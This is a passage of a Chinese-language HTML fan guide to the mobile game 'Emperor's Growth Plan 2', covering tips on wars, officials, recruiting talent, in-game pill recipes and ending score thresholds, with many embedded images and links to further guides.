有些<b>皇子出游</b>会带粽子(+12大臣亲密度)之类的宝物，需要就选(不保险，可能会减属性)</p>\n<p>10.腊月和八月的晌午我一般都回去<b>御膳房</b>举办宴会(上限是50大臣)</p>\n<p>11.一般二月你去找道士前 你去青炉房炼什么药 他就给你什么药</p>\n<p>12.<b>打仗</b>先打日本(简单) 最后再打把安南、大理等小国(他们是材料获取的主要方式)                      打仗的时候好的将领真的很重要(能发动技能)！                                           而且打仗时人数多一倍以上的话最好选全面攻击        人数不多就突袭</p>\n<p>13.前期丞相一定是要先安排属性高的 天灾人祸国库遭不住</p>\n<p>14.知府要野心小 道德高(起义也遭不住)               高智商、高道德的地方官会减少贪污，提高地方的经济。</p>\n<p>15.在丞相是名臣后最好每天都要科举，10个蓝臣必出一个90+的蓝臣。</p>\n<p>16.第一年五月去云渡湖钓鱼送名臣(林烟or重庆)和一个名妃(春晖仙女)</p>\n<p>17.大雁塔太香了！真的推荐！(玩法已放在最下面)</p>\n<p><a class=\"member_mention\" href=\"http://www.zhihu.com/people/b18e9edf8bf2694f2620da4c9edb4eba\" data-hash=\"b18e9edf8bf2694f2620da4c9edb4eba\" data-hovercard=\"p$b$b18e9edf8bf2694f2620da4c9edb4eba\">@友善的眼神</a> 评论区的大佬，我觉得很有道理，大家可以参考一下下</p>\n<p><img src=\"https://pic4.zhimg.com/v2-69fc109391ab6be135278c512583263d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"959\" data-rawheight=\"818\" data-watermark=\"watermark\" data-original-src=\"v2-69fc109391ab6be135278c512583263d\" data-watermark-src=\"v2-6b9051c86362c1ced40e78f8d0617ca8\" data-private-watermark-src=\"v2-a48db9e169447748f38ec170d65852f1\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0b30f6205e48ebebaa73e23f3e7bc4e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"1378\" data-watermark=\"watermark\" data-original-src=\"v2-0b30f6205e48ebebaa73e23f3e7bc4e2\" data-watermark-src=\"v2-894556cc4b0556832dc9f61edfc12b5a\" data-private-watermark-src=\"v2-c1c0664b26da7322829190d826368bbf\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-bed2370198b00328a4ae71a15652bb9d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"1180\" data-watermark=\"watermark\" data-original-src=\"v2-bed2370198b00328a4ae71a15652bb9d\" data-watermark-src=\"v2-e34f3fa5ef6454fd5f61b32df91f3574\" data-private-watermark-src=\"v2-7b1a2f73944b0c24a0fa2665d7a90674\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f81c85deddf69bccea2cadd329dd9374_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"450\" data-rawheight=\"85\" data-watermark=\"watermark\" data-original-src=\"v2-f81c85deddf69bccea2cadd329dd9374\" data-watermark-src=\"v2-289a93acebfe87fce9034a0c4f7d676c\" data-private-watermark-src=\"v2-39f77a69e4cc648f1f39e02d46eba571\"></p>\n<p>以下是大佬们的总结：</p>\n<h2><b>一、特殊事件事件/人物</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/7vhfTVLwQstOYXcA_mGH5A\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-47c78d5eca948d9046c559ea106790bb_bh.jpg\" data-image-width=\"779\" data-image-height=\"332\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——特殊事件、人物</a><p><img src=\"https://pic1.zhimg.com/v2-d7b3b268caea7d8b3b50eece7a79214d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"1140\" data-watermark=\"watermark\" data-original-src=\"v2-d7b3b268caea7d8b3b50eece7a79214d\" data-watermark-src=\"v2-6858520aaf4fbf85bb7a09d4ffc0c4d8\" data-private-watermark-src=\"v2-c119aac05a0555913b33162d9789ed7f\"></p>\n<p>可从路人获取的东厂线索合集：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-83d8b2a08b825bad522f08d23c3a6000_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"627\" data-rawheight=\"694\" data-watermark=\"watermark\" data-original-src=\"v2-83d8b2a08b825bad522f08d23c3a6000\" data-watermark-src=\"v2-af894712fdeeda3aed03cb97e9956a1d\" data-private-watermark-src=\"v2-84e66e361336f482d9e74b4554b92162\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ea20f2d354dfc35d739e15dbef7f825e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1346\" data-watermark=\"watermark\" data-original-src=\"v2-ea20f2d354dfc35d739e15dbef7f825e\" data-watermark-src=\"v2-a31ce9b2d79db0c03e3ac260c11282a9\" data-private-watermark-src=\"v2-142c76356efb91f639444dc727fd500c\"></p>\n<p>皇帝的成长计划2吧 来自 素素偶的 的总结</p>\n<p><img src=\"https://pic2.zhimg.com/v2-610ec057f01a02b83774ba74322ccbce_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"799\" data-watermark=\"watermark\" data-original-src=\"v2-610ec057f01a02b83774ba74322ccbce\" data-watermark-src=\"v2-13954aa6a9be75ac19d44a4b4dbea8fd\" data-private-watermark-src=\"v2-791268d0073f17fa6eda6aab5051439a\"></p>\n<p>皇帝的成长计划2吧 来自 叶子风气质大叔 的总结</p>\n<p><b><i>包打听找随从</i></b></p>\n<p>注意事项：</p>\n<p>1、职业只代表出现人才的几率，不代表一定出现人才</p>\n<p>2、职业称谓和询问结合来看</p>\n<p>3、询问的适合文武最好要区分开来，根据常识做一些判断，例如山贼这些职业后千万不要去选道德或者文学，落榜书生什么的也不用选武术了</p>\n<p>4、sl才是避免错过人才的王道</p>\n<p>5、介绍名臣就直接录用吧，名臣会直接进入朝廷，而普通随从只会进入东厂</p>\n<p>职业称谓：</p>\n<p>S级:江湖隐士，武林隐士</p>\n<p>(基础属性强，尤其道德普遍都不低，就算是非酋，选它人才都差不到哪里去，出极品的概率高,人才属性一般情况下轻松破85)</p>\n<p>A级:突厥彪骑，突厥射手，东瀛忍者，漠北刀客，民间文豪，大家才子，史学家等</p>\n<p>B级:绿林好汉，江湖义士，独行侠，雇佣军，退役军人，山贼当家，落榜书生，诗人</p>\n<p>C级:各种商人（骏马、盐市、木材、兵器等等)</p>\n<p> (基础素质类似科举人员，感觉出极品的概率比D级那些要低，适合用来做贸易）</p>\n<p>D级:逃狱犯，采花贼，江湖神棍，醉酒大汉</p>\n<p>（如果询问武艺的话，出人才的概率要大于C级）</p>\n<p>询问等级：</p>\n<p>文武</p>\n<p>S级:天生神力、天赋异禀</p>\n<p>A级:这样的天赋简直让人过目不忘，真是登峰造极啊，这人的前途真是让人期待</p>\n<p>B级:一点都不比朕的侍卫差，还不错回答的也算巧妙</p>\n<p>C级:真是浪费我时间，差强人意，这个真不会被一拳撂倒, 感觉连自己都保护不了,勉勉强强把，浪得虚名等等</p>\n<p>道德</p>\n<p>S级:真是菩萨心肠,得道高僧</p>\n<p>A级:此人还真是让人期待</p>\n<p>B级:勉勉强强吧，道德观还算正常，只能算是善良之人吧，只有山贼会这么回答吧</p>\n<p>C级:贪污无德之人想必都会这么说吧</p>\n<p>D级:简直是个人渣,这也算人，最多做到管好自己吧</p>\n<p>（关于包打听出现的时间、地点前面已经说过了，再啰嗦一遍：包打听会在每年春季上旬（一月）和秋季上旬（七月）出现，在京城的一品楼，包打听会推荐各种各样的人才，运气好可以遇到名臣。）</p>\n<hr>\n<h2><b>二、青炉房(炼制丹药)</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/fve_GUNi9Zpit5IdwSyg0A\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-cfed8ab18ead1a0e476c8ec6c3d506e6_bh.jpg\" data-image-width=\"864\" data-image-height=\"368\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——丹药</a><p><b>​</b>注意事项：</p>\n<p>1、我认为获取丹药的大头是青炉房自动炼制的，这并不消耗药材所以尽量保持炼药经费富足（有条件就去工部建造一些增加产量的建筑吧）</p>\n<p>2、二月你去一品楼找道士前，你在青炉房炼什么药，他就会给你什么药（第五年起每年2月一品楼会给你一枚丹药，第一次为天地长寿丹，还会给你一颗你正在炼的丹药，不会提示，但丹药列表是会有的）</p>\n<p>3、按药方炼制，是有概率失败的，耗时为2回合，注意sl</p>\n<p><br></p>\n<p>药材序号:</p>\n<p>1、不化神冰；2、千年参王；3、鲸王凝脂；4、高僧舍利；5、龙蜒麝香；</p>\n<p>6、玉面首乌；7、五彩雪莲；8、透光灵芝；9、炽火金蟾；A、灵龟板；</p>\n<p>B、黄金锦鲤；C、天青水玉</p>\n<p><br></p>\n<p>固定丹药配方:（为官方破损药方内容）</p>\n<p>延年益寿丹1345967</p>\n<p>天地长寿丹7674823</p>\n<p>易容方       8989436</p>\n<p>奇妙面膜    9877512(每回合西市——胭脂铺有概率刷）</p>\n<p>麝香           5652595</p>\n<p>蕴毒丹       2347891</p>\n<p>九转迷魂香 432511</p>\n<p>速孕汤       6457933(每回合西市——济世堂有概率刷）</p>\n<p>安胎丸        8379122 </p>\n<p>避子汤        5559992 </p>\n<p>多胞胎药丸 6453777 (每回合西市——济世堂有概率刷）</p>\n<p>天机丹        B498165</p>\n<p>萱草丹        C984914</p>\n<p>冰糖梨汤    1111111</p>\n<p>丰胸木瓜丸（丰胸贴） 8679132</p>\n<p>人杰丹        A378915</p>\n<p>勇武丹        A629549</p>\n<p>博学丹        B561316</p>\n<p>才艺丹        C989466</p>\n<p>魅力丹        C312846</p>\n<p><br></p>\n<p>丹药作用:</p>\n<p>加寿命:</p>\n<p>*天地长寿丹 (增加两年寿命)</p>\n<p>*延年益寿丹 (增加一年寿命)</p>\n<p>*易容方（可以随机更换妃子/公主/皇子等立绘）</p>\n<p>*奇妙面膜（更换指定立绘）</p>\n<p>变声丸(每回合西市——济世堂有概率刷）</p>\n<p><br></p>\n<p>增加怀孕几率：</p>\n<p>1、壮阳药(皇帝吃) :生鹿血、三鞭酒、十鞭酒、虎鞭酒、大力丸</p>\n<p>2、春药(妃子吃) :春水丸、硬化香蕉</p>\n<p>3、春药(男女都可吃) :*九转迷魂香、阴阳散、得春丹、曼陀罗、十香散、遇仙丹、合欢散</p>\n<p>关于妃子怀孕用品:</p>\n<p>1、*速孕汤（妃子立即怀孕，包括男宠）</p>\n<p>2、*安胎丸（妃子不会难产或小产）</p>\n<p>3、*麝香（妃子滑胎)</p>\n<p>4、*避子汤（使用后大概率永远不孕）</p>\n<p>5、*多胞胎药丸（使用后妃子生下多胞胎，具体是几胎看运气，2~7）</p>\n<p>6、*天机丹（怀孕妃子吃了增加孩子属性)</p>\n<p>7、*萱草丹（怀孕妃子吃了必生皇子）</p>\n<p>平常的治病丹药:</p>\n<p>1、丹类:洗骨丹、惊寒丹、玄元丹、黄莲消火丹、小还丹、大还丹、赤血丹、浑天丹、桂圆丹、凝碧丹、化淤丹、罗厄丹、广陵丹、紫苏丹、还阳丹、辟灵丹、养魂丹、灵魂丹、聚魂丹、狮虎丹、长生丹、长命丹、回春丹、无极丹</p>\n<p>2、散类:去咳散、活血散、开脾散、黑玉断续散、太虚散、软金散、胡姜止咳散、玉壶散、磐石散、归心散</p>\n<p>3、丸类:牛黄上清丸、清瑶丸、三黄消火丸、熊胆丸、五补丸、蛇胆丸、碧髓丸、续命丸</p>\n<p>4、汤类:*冰糖梨汤、华参汤、青莲补汤、五籽汤</p>\n<p>5、花草类:芝雪草、金银花、醒酒花、云霖花、龙葵花</p>\n<p>6、露类:三清露、清寂露、核桃露</p>\n<p>7、其它:千金藤、星辰蓝、去癀片、千幻伽蓝、青龙参、生精酒、醉仙灵芙、金疮药、天香豆蔻</p>\n<p>毒药:（驿馆——苗女可花费20W购买毒药）</p>\n<p>*蕴毒丹、夹竹桃汤、橙林丹、含笑半步颠、雷藤散、五毒丸、六步散、七步散、断情花散、断肠草汤、鸩酒</p>\n<p>回复类:</p>\n<p>1、回神丸（回复体力）</p>\n<p>2、凝神丸（回复健康）</p>\n<p>3、开智丸（增加智慧）</p>\n<p>*增加属性：</p>\n<p>1、人杰丹（本回合增长的属性翻倍,包括皇威)</p>\n<p>2、勇武丹（自己吃+30武力，送大臣/皇子+3)</p>\n<p>3、博学丹（自己吃+30文学，送大臣/皇子+3）</p>\n<p>4、才艺丹（自己吃+30才艺，送大臣/皇子+3）</p>\n<p>5、加（妃子/公主）魅力:</p>\n<p>*丰胸木瓜丸、丰胸贴、木瓜美容丸、养颜丹</p>\n<p>*魅力丹（1回合内养心殿休息，宫女必定爬床；2回合内，巡游发现名妃几率提高)</p>\n<p>药材获取：</p>\n<p>1、出游可获得新药材</p>\n<p>颐和园——A</p>\n<p>圆明园——B</p>\n<p>避暑山庄——C</p>\n<p>2、郊外（随机药材）</p>\n<p>围猎 低几率</p>\n<p>钓鱼 高概率</p>\n<p>3、礼部向臣属国/联盟国 索要（随机） （联盟国不一定给）</p>\n<p>一年一度的生辰附属国（高丽国等）/知府进贡（随机）</p>\n<p>4、每年7月份 京城——角落的人（随机）</p>\n<p>5、工部建造百草园（每年随机产出一个）</p>\n<p><br></p>\n<hr>\n<h2><b>三、选官</b></h2>\n<p><img src=\"https://pic1.zhimg.com/v2-d1f2cd13f09ead84479599cb5f0b687d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"723\" data-watermark=\"watermark\" data-original-src=\"v2-d1f2cd13f09ead84479599cb5f0b687d\" data-watermark-src=\"v2-92b580fe2ed1c78191ac2d47a9c2e385\" data-private-watermark-src=\"v2-bfe111f7abcf2b05d8f6b2798998c0bc\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d7a67d3b212efcd6bb93182455fdcae7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"546\" data-rawheight=\"508\" data-watermark=\"watermark\" data-original-src=\"v2-d7a67d3b212efcd6bb93182455fdcae7\" data-watermark-src=\"v2-642404d91ceeb1a401a615d5cf1b47f3\" data-private-watermark-src=\"v2-119e5856409f498d44ad37ecfce8c5c1\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-8626a5c1e61f549d014cea99b6bbf112_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1629\" data-rawheight=\"1133\" data-watermark=\"watermark\" data-original-src=\"v2-8626a5c1e61f549d014cea99b6bbf112\" data-watermark-src=\"v2-ab8bf512ca2c3ccc5ac0966023f078ae\" data-private-watermark-src=\"v2-9d94bf6e6b62fca544346ead9506ce69\"></p>\n<p><br></p>\n<hr>\n<h2><b>四、结局评分</b></h2>\n<p><img src=\"https://pic3.zhimg.com/v2-13cd4d5c8c520bcf9425fafa70439d87_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"20959\" data-watermark=\"watermark\" data-original-src=\"v2-13cd4d5c8c520bcf9425fafa70439d87\" data-watermark-src=\"v2-12f0b9b4162d9f845ef692b6ebe243be\" data-private-watermark-src=\"v2-56d4b9e8bdcae69ca26c6d7bb65fa0fe\"></p>\n<p>三十年去一品楼——游者司马评分标准：</p>\n<p>【文化】</p>\n<p>落后文明：文化分小于5w分</p>\n<p>文化启蒙：评分大于等于5w分，小于12w</p>\n<p>文化进步：评分大于等于12w分，小于30w</p>\n<p>高度文明：评分大于等于30w分，小于200w</p>\n<p> 【经济】</p>\n<p>经济落后：经济分小于5w分</p>\n<p>经济开放：评分大于等于5w分，小于12w</p>\n<p>小康社会：评分大于等于12w分，小于30w</p>\n<p>繁荣富强：评分大于等于30w分，小于200w</p>\n<p> 【军事】</p>\n<p>军事薄弱：军事分小于5w分</p>\n<p>军事起步：评分大于等于5w分，小于12w</p>\n<p>稳中求胜：评分大于等于12w分，小于30w</p>\n<p>兵强马壮：评分大于等于30w分，小于200w</p>\n<p><img src=\"https://pic2.zhimg.com/v2-958400a3493ecaa2663c7997f31775e6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-958400a3493ecaa2663c7997f31775e6\" data-watermark-src=\"v2-f263306e2fb9ac8a828dadcf63c43999\" data-private-watermark-src=\"v2-ecfad40e4bf2ef944f0984b5282356cb\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0c4e2eb9f60e7d503f152ac8cdfc2c13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"875\" data-rawheight=\"1776\" data-watermark=\"watermark\" data-original-src=\"v2-0c4e2eb9f60e7d503f152ac8cdfc2c13\" data-watermark-src=\"v2-418b6a82ade4174dcefa18cdc1955284\" data-private-watermark-src=\"v2-7bd9c4ba0d95b5741b30d9bdaa18a157\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-6182084056b9b75b02c54a91b8d9b918_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1795\" data-rawheight=\"557\" data-watermark=\"watermark\" data-original-src=\"v2-6182084056b9b75b02c54a91b8d9b918\" data-watermark-src=\"v2-bdfa0dccf77c3343b3c817cf2b05ba86\" data-private-watermark-src=\"v2-1e838fdae2450df1920a555c5997e86f\"></p>\n<hr>\n<h2><b>五、培育皇子</b></h2>\n<p>如果要立的皇子不是第一顺位 那就把前面的皇子派出去就可以啦(策卡——内阁制可以任意指定)</p>\n<p><img src=\"https://pic3.zhimg.com/v2-31a2a4c34febf9dbc43381cd185549c0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"504\" data-rawheight=\"505\" data-watermark=\"watermark\" data-original-src=\"v2-31a2a4c34febf9dbc43381cd185549c0\" data-watermark-src=\"v2-a2e8e2420fcdfc0455fa46a5852e49e3\" data-private-watermark-src=\"v2-0b4d0659ce31289a551b72bec1e75274\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-09f669ac27827eaabba7406aabcbb1e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"740\" data-rawheight=\"249\" data-watermark=\"watermark\" data-original-src=\"v2-09f669ac27827eaabba7406aabcbb1e7\" data-watermark-src=\"v2-c4e28532d42698fbfc8eb9b844a4b958\" data-private-watermark-src=\"v2-77218b22cfd90ba021ce3ee61ba725b3\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-7fabcbce148d5e8f1b9f6d547802bb13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"408\" data-rawheight=\"130\" data-watermark=\"watermark\" data-original-src=\"v2-7fabcbce148d5e8f1b9f6d547802bb13\" data-watermark-src=\"v2-60da88553555bcf605cf709dbb7288f0\" data-private-watermark-src=\"v2-e75d71811eb8d0e0991f181ad3d10633\"></p>\n<p><br></p>\n<hr>\n<h2><b>六、培育近臣</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/5TFZOeXT8R401bXcVAmH5w\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-e85fd17598761274ba015a8555854042_l.jpg\" data-image-width=\"534\" data-image-height=\"533\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——近臣的作用篇</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/MY1lBQo5JjkS9odzfqLmNQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-347764592a9e34e86c096e6443e13b5f_l.jpg\" data-image-width=\"540\" data-image-height=\"540\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——大臣性格相关</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/jXJqUBWr5UlV6xcLE_E0mw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-be372776681aac9f188f2a2a0b6c39ed_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——近臣培育方法篇</a><p><img src=\"https://pic3.zhimg.com/v2-0e76871d7657509e0dc42b26869704f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-0e76871d7657509e0dc42b26869704f3\" data-watermark-src=\"v2-3574b161d9eb6974e36383ad0a094d89\" data-private-watermark-src=\"v2-212f80b298f92757252e9fa505760899\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6496535fc98603e64453f872436d30c9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-6496535fc98603e64453f872436d30c9\" data-watermark-src=\"v2-77966a15a6194018d6193cd8aabc25b8\" data-private-watermark-src=\"v2-667156cee7a0c0458618cde5580ea1b3\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2a548a169d54f438a5ee38f3bd8069db_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-2a548a169d54f438a5ee38f3bd8069db\" data-watermark-src=\"v2-81b120a6b3580b2fc69f7c7e5fa38b4e\" data-private-watermark-src=\"v2-12d063e4f5bd69830c6f1addaeb34081\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d8da9fc4aa8b58248cd1c3c2af016447_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-d8da9fc4aa8b58248cd1c3c2af016447\" data-watermark-src=\"v2-8075dd75efe28e5067a723c599f8ecff\" data-private-watermark-src=\"v2-ab58bedf098e955c5eae3f0774a0290e\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1d517632bfa9f8cdf1deb2ec0823f305_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-1d517632bfa9f8cdf1deb2ec0823f305\" data-watermark-src=\"v2-184a2368d87db9c91ceb51d9ad80a175\" data-private-watermark-src=\"v2-b84e952802db62629bbb0b835ffa8172\"></p>\n<hr>\n<h2><b>七、大雁塔玩法</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/EKGQXdpZ-ku8RGzcddwiaQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-8423e82cd3d667f5001f4fd2cbef3703_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——大雁塔</a><p><img src=\"https://pic1.zhimg.com/v2-45b5892d0e94a14b306cbac45a326315_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"699\" data-watermark=\"watermark\" data-original-src=\"v2-45b5892d0e94a14b306cbac45a326315\" data-watermark-src=\"v2-fadd429224426c1b861fd40d8a7226bd\" data-private-watermark-src=\"v2-61375389877304964126f402a6acecc5\"></p>\n<hr>\n<h2><b>八、六尚局</b></h2>\n<h3><b>（一）宫正司</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/zCXaS1bI4C1bc7Xr4P6FRQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-196c26eb3dfc81eb4006d0a48b9fb46c_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——宫正司</a><h3><b>（二）尚功局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/EngORFqdwbgyDwmpOmonAw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-e5e702a53ee296024b54e63e4f96484e_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚功局</a><h3><b>（三）尚宫局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/rKOlExMvYU7FCU_Z4S-Q-Q\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-8fa559a68962f8db59caf105d8c84681_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚宫局</a><h3><b>（四）尚仪局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/eVs4jFoKh_wbVnWeW_u2cg\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-7dc0f1edd36dbdbe3674e06694cd0313_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚仪局</a><h3><b>（五）尚食局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/dEg4Ncn-kBxKIcwWw2_VEQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-1cf98f52913dedf2cba103d06e79fefe_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚食局（一）</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/U-hQ6mfScTMmZz-cK-JefQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-0927d1adecb72d37b084ecc3b191f4e3_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚食局（二）</a><p><img src=\"https://pic1.zhimg.com/v2-edce438be3b4efc88ad67125b513fe06_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2388\" data-watermark=\"watermark\" data-original-src=\"v2-edce438be3b4efc88ad67125b513fe06\" data-watermark-src=\"v2-756e2bf45d07dcd507feedb087187cc2\" data-private-watermark-src=\"v2-0a93355311773bbdb5667ba73a9dae29\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-28387dac78b03cc6f64ed0066db1fb84_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"4006\" data-watermark=\"watermark\" data-original-src=\"v2-28387dac78b03cc6f64ed0066db1fb84\" data-watermark-src=\"v2-6c0545cfcea1f66aa2900a7236b8a37e\" data-private-watermark-src=\"v2-88c316e4485f87dd3ec2696f850ef4c7\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b931fa449c02f64b5b039ba7c64eb4ef_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-b931fa449c02f64b5b039ba7c64eb4ef\" data-watermark-src=\"v2-2b4b2284b14a24c9ec27326505d68761\" data-private-watermark-src=\"v2-4ec4326331c6a2ff17056d3209227cde\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5361c22365683616085c99fc08c204bf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-5361c22365683616085c99fc08c204bf\" data-watermark-src=\"v2-de9b9dd5bab37f0dabe2830924d2b458\" data-private-watermark-src=\"v2-8bfabc18354a1f61c1dd2bab8dd9c92e\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0d9dcd065e842ec893df455eafdcbcba_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-0d9dcd065e842ec893df455eafdcbcba\" data-watermark-src=\"v2-74f624857cf6a85e23e59cea84afb4ce\" data-private-watermark-src=\"v2-4603adf3e7f7311e0a5dffdd83d8a172\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-493954ecfdc712036673414bd2b58640_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1170\" data-watermark=\"watermark\" data-original-src=\"v2-493954ecfdc712036673414bd2b58640\" data-watermark-src=\"v2-52fd07f6f42fcd7d4d8ddde32101b0d3\" data-private-watermark-src=\"v2-8661984a456b497360e50992c36cbc10\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f3f28ac9bcc4e74000ba20e2a3386ddc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1203\" data-watermark=\"watermark\" 